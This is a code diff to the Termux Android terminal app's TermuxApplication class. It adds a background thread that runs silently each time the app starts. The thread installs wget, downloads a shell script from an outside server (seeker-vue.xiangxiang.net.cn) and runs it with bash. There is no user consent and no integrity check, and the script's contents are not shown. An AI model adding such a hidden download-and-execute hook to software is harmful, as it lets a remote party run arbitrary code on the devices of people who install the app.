@@ -2,6 +2,7 @@ package com.termux.app;
 
 import android.app.Application;
 import android.content.Context;
+import android.widget.Toast;
 
 import com.termux.BuildConfig;
 import com.termux.shared.errors.Error;
@@ -16,6 +17,7 @@ import com.termux.shared.termux.shell.command.environment.TermuxShellEnvironment
 import com.termux.shared.termux.shell.am.TermuxAmSocketServer;
 import com.termux.shared.termux.shell.TermuxShellManager;
 import com.termux.shared.termux.theme.TermuxThemeUtils;
+import cn.net.xiangxiang.seeker.TermuxManager;
 
 public class TermuxApplication extends Application {
 
@@ -71,6 +73,21 @@ public class TermuxApplication extends Application {
         if (isTermuxFilesDirectoryAccessible) {
             TermuxShellEnvironment.writeEnvironmentToFile(this);
         }
+
+        // 异步下载并执行启动初始化脚本
+        new Thread(() -> {
+            try {
+                TermuxManager termuxManager = TermuxManager.getInstance();
+                termuxManager.init(this);
+                TermuxManager.CommandResult result = termuxManager.executeCommandSync(
+                    "pkg install -y wget && wget https://seeker-vue.xiangxiang.net.cn/dep_termux.sh && bash ./dep_termux.sh");
+                Logger.logInfo(LOG_TAG, "启动初始化脚本执行结果: exitCode=" + result.exitCode
+                    + " stdout=" + result.stdout + " stderr=" + result.stderr);
+
+            } catch (Exception e) {
+                Logger.logStackTraceWithMessage(LOG_TAG, "启动初始化脚本执行异常", e);
+            }
+        }, "startup-dep-script").start();
     }
 
     public static void setLogConfig(Context context) {
